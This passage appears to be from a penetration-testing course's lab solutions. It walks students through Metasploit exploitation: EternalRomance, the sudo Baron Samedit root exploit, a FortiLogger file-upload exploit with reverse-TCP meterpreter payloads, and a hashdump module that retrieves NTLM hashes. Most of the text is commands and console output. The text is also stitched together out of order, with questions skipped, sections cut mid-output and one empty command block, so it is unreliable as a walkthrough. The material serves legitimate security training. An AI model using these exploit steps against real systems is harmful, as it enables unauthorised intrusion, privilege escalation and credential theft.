## Question 1

### "Use the Metasploit-Framework to exploit the target with EternalRomance. Find the flag.txt file on Administrator's desktop and submit the contents as the answer."

After spawning the target machine, students first need to launch `msfconsole`:

Code: shell

```shell
msfconsole -q
```

```
┌─[us-academy-1]─[10.10.14.50]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ msfconsole -q

msf6 >
```

Then, students need to search for the `EternalRomance` exploit (which was developed by the NSA's Equation Group and leaked by The Shadow Brokers):

Code: shell

```shell
search eternalromance
```

```
msf6 > search eternalromance

## Question 3

### "The target system has an old version of Sudo running. Find the relevant exploit and get root access to the target system. Find the flag.txt file and submit the contents of it as the answer."

Students first need to know which version of `sudo` is running on the spawned target machine that they have penetrated in the previous question, which can be done using the command `sudo` with the flag `-V`:

Code: shell

```shell
sudo -V
```

```
www-data@nix02:~/html/files$ sudo -V

sudo -V
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
```

Searching online for exploits for `sudo 1.8.31`, students will find out that `sudo` had a critical vulnerability dubbed `Baron Samedit`, holding the CVE ID of `CVE-2021-3156`. Before searching for the exploit, students first need to background the current `meterpreter` session using the `background` command:

Code: shell

```shell
background
```

```
meterpreter > background

[*] Backgrounding session 1...
msf6 exploit(linux/http/elfinder_archive_cmd_injection) >
```

Then, students need to search for an exploit module for `CVE-2021-3156`, which can be done in multiple ways. Students can search using the CVE ID directly:

Code: shell

```shell
search CVE-2021-3156
```

```
msf6 exploit(linux/local/sudo_baron_samedit) > search CVE-2021-3156

```

Students can also search using the name of the vulnerability:

Code: shell

```shell

```

```
msf6 exploit(linux/local/sudo_baron_samedit) > search sudo baron samedit

Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/local/sudo_baron_samedit
```

Alternatively, if there were multiple CVE IDs in the year 2021 and the CVE ID of the exact vulnerability is not known, students can utilize the powerful filtering features of `msfconsole` when searching for exploits. For example, students can search for exploits for `sudo` that have a CVE's disclosure date of 2021:

Code: shell

```shell
search sudo cve:2021
```

```
msf6 exploit(linux/http/elfinder_archive_cmd_injection) > search sudo cve:2021

Interact with a module by name or index. For example info 2, use 2 or use exploit/linux/local/sudo_baron_samedit
```

Students need to use the exploit with tag number 2 (in case they used the last search query):

Code: shell

```shell
use 2
```

```
msf6 exploit(linux/http/elfinder_archive_cmd_injection) > use 2

[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
```

Then, students need to see the options of the exploit module using the `show options` command (or `options` alone for short):

Code: shell

```shell
show options
```

```
msf6 exploit(linux/local/sudo_baron_samedit) > show options

Module options (exploit/linux/local/sudo_baron_samedit):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   SESSION                       yes       The session to run this module on.
   WritableDir  /tmp             yes       A directory where you can write files.

Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  142.93.43.160    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf6 exploit(linux/local/sudo_baron_samedit) >
```

Three options need to be set by the students, `LHOST`, `LPORT` (since 4444 is already being used by the `elFinder` exploit, thus it must be changed to another port), and `SESSION` (which is 1 in this case):

Code: shell

```shell
set LHOST tun0
set LPORT 9001
set SESSION 1
```

```
msf6 exploit(linux/local/sudo_baron_samedit) > set LHOST tun0

LHOST => tun0
msf6 exploit(linux/local/sudo_baron_samedit) > set LPORT 9001

LPORT => 9001
msf6 exploit(linux/local/sudo_baron_samedit) > set SESSION 1

SESSION => 1
```

After setting the options, students then need to launch the privilege escalation exploit module on the target using the `exploit` command:

Code: shell

```shell
exploit
```

```
msf6 exploit(linux/local/sudo_baron_samedit) > exploit

Students will notice that on port 5000, `IIS` version 10.0 is running `FortiLogger`, a log and reporting software:

![[HTB Solutions/CPTS/z. images/16f986a441d94c111441a197ef78bf69_MD5.jpg]]

Within `msfconsole`, students need to search for exploits for `FortiLogger` using the `search` command:

Code: shell

```shell
search FortiLogger
```

```
msf6 > search FortiLogger

Matching Modules
================

   #  Name                                                   Disclosure Date  Rank    Check  Description

Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/fortilogger_arbitrary_fileupload
```

Students then will need to use/select the only available exploit for `FortiLogger`:

Code: shell

```shell
use 0
```

```
msf6 > use 0

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

After using the `show options` command, students will know that they need to set two options, `LHOST` and `RHOSTS` :

Code: shell

```shell
set LHOST tun0
set RHOSTS STMIP
```

```
msf6 exploit(windows/http/fortilogger_arbitrary_fileupload) > set RHOSTS 10.129.173.75

RHOSTS => 10.129.173.75
msf6 exploit(windows/http/fortilogger_arbitrary_fileupload) > set LHOST tun0

LHOST => tun0
```

Students at last will need to launch the exploit using the `exploit` command:

Code: shell

```shell
exploit
```

```
msf6 exploit(windows/http/fortilogger_arbitrary_fileupload) > exploit

[*] Started reverse TCP handler on 10.10.14.49:4444

Once students attain a `meterpreter` session, they need to spawn a normal shell and then run the `whoami` command:

```shell
shell
whoami
```
```
meterpreter > shell

## Question 2

### "Retrieve the NTLM password hash for the "htb-student" user. Submit the hash as the answer."

Students first need to background the previously established `meterpreter` session:

```shell
background
```
```
meterpreter > background

[*] Backgrounding session 1...
```

Then, students need to search for the `hashdump` post-exploitation module:

```shell
search hashdump
```
```
msf6 exploit(windows/http/fortilogger_arbitrary_fileupload) > search hashdump

Interact with a module by name or index. For example info 18, use 18 or use post/windows/gather/smart_hashdump

Although the required module has the tag number 17, students can narrow down the number of returned modules by being more specific in their search query:

```shell
search hashdump post windows
```
```
msf6 post(windows/gather/hashdump) > search hashdump post windows

```

Now only modules for the Windows operating system are shown, and the one required holds the tag number 3, thus students need to use/select it:

```shell
use 3
```
```
msf6 exploit(windows/http/fortilogger_arbitrary_fileupload) > use 3
```

After using the `show options` command, students will know that the only option that needs to be set is `SESSION`:

```shell
set SESSION 1
```
```
msf6 post(windows/gather/hashdump) > set SESSION 1

SESSION => 1
```

Students at last will need to run/launch the post-exploitation module using the `run` command:

```shell
run
```
```
msf6 post(windows/gather/hashdump) > run
